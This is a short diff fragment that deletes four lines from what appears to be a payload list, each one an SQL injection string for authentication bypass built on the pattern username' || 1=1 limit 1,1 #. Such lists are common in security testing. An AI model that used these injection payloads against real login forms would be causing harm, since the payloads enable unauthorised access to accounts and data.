@@ -1,4 +1,0 @@
-Payload: username' || 1=1 limit 1,1 #1
-Payload: username' limit 1,1 #1
-Payload: username' || 1=1 limit 1,1 #1
-Payload: username" || 1=1 limit 1,1 #1
